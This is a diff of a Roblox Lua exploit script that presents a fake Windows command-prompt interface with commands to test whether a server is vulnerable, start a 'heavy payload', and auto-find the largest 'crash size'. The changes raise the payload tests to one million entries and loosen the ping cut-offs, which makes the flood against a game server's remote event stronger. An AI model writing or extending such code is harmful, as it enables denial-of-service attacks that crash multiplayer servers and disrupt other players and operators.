@@ -7,7 +7,7 @@ local Stats = game:GetService("Stats")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- ═══════════ CORE LOGIC (SINGLE HEAVY REMOTE) ═══════════
+-- ═══════════ CORE LOGIC ═══════════
 local Children       = 180000
 local FireBurst      = 1.5
 local FrameDelay     = 0.130
@@ -258,7 +258,7 @@ local function processCommand(input)
         log("  !test           - Check if the server is vulnerable", Color3.fromRGB(0, 200, 255))
         log("  !crash          - Start the heavy payload", Color3.fromRGB(200, 200, 200))
         log("  !stop           - Stop the payload", Color3.fromRGB(200, 200, 200))
-        log("  !limit          - Find max safe size (Tests up to 400k)", Color3.fromRGB(200, 200, 200))
+        log("  !limit          - Find max safe size (Tests up to 1M)", Color3.fromRGB(200, 200, 200))
         log("  !size <number>  - Set payload size (e.g. !size 180000)", Color3.fromRGB(200, 200, 200))
         log("  !ping           - Check server ping & advice", Color3.fromRGB(200, 200, 200))
         log("  !cls            - Clear screen", Color3.fromRGB(200, 200, 200))
@@ -343,7 +343,7 @@ local function processCommand(input)
         end
         
     elseif cmd == "!limit" then
-        log("[*] Starting Auto-Limit Test. Pushing to the absolute maximum...", Color3.fromRGB(0, 200, 255))
+        log("[*] Starting Auto-Limit Test. Pushing up to 1,000,000...", Color3.fromRGB(0, 200, 255))
         task.spawn(function()
             local remote = resolve()
             if not remote then 
@@ -354,19 +354,19 @@ local function processCommand(input)
             local wasRunning = state.running
             if wasRunning then stopCrash() end
             
-            -- ✅ EXTREMELY LONG LIMITS (Testing up to 400,000)
-            local sizes = {50000, 100000, 150000, 200000, 250000, 300000, 400000}
+            -- ✅ TESTING EVERY 100K UP TO 1 MILLION
+            local sizes = {100000, 200000, 300000, 400000, 500000, 600000, 700000, 800000, 900000, 1000000}
             local bestSize = 50000
             
             for _, sz in ipairs(sizes) do
                 log("[*] Testing " .. sz .. " payload...", Color3.fromRGB(200, 200, 200))
                 local before = getPing()
                 
-                -- Yield build to prevent freeze
+                -- Yield build so game doesn't freeze
                 local p = {}
                 for j = 1, sz do
                     p[j] = {id = j, v = j}
-                    if j % 10000 == 0 then task.wait() end
+                    if j % 20000 == 0 then task.wait() end
                 end
                 
                 local endT = tick() + 2.5
@@ -381,9 +381,9 @@ local function processCommand(input)
                 
                 log(string.format("[+] %d payload -> Spike: %dms (Total Ping: %dms)", sz, spike, after), Color3.fromRGB(0, 255, 0))
                 
-                -- Stop only if we are about to kick you
-                if after > 2500 or spike > 2000 then
-                    log("[!] DANGER: This size is starting to kick you!", Color3.fromRGB(255, 50, 50))
+                -- Only stop if the ping is literally about to kick you (over 3500ms)
+                if after > 3500 or spike > 3000 then
+                    log("[!] DANGER: This size is starting to kick you! Stopping test.", Color3.fromRGB(255, 50, 50))
                     break
                 else
                     bestSize = sz
@@ -459,7 +459,7 @@ log("Microsoft Windows [Version 10.0.19045.3803]", Color3.fromRGB(200, 200, 200)
 log("(c) Microsoft Corporation. All rights reserved.", Color3.fromRGB(200, 200, 200))
 log("", Color3.fromRGB(200, 200, 200))
 log("Type '!help' for a list of available commands.", Color3.fromRGB(0, 255, 0))
-log("Pro tip: Use '!limit' to auto-find the max safe crash size.", Color3.fromRGB(0, 200, 255))
+log("Pro tip: Use '!limit' to test all the way up to 1,000,000.", Color3.fromRGB(0, 200, 255))
 log("", Color3.fromRGB(200, 200, 200))
 
 inputBox:CaptureFocus()
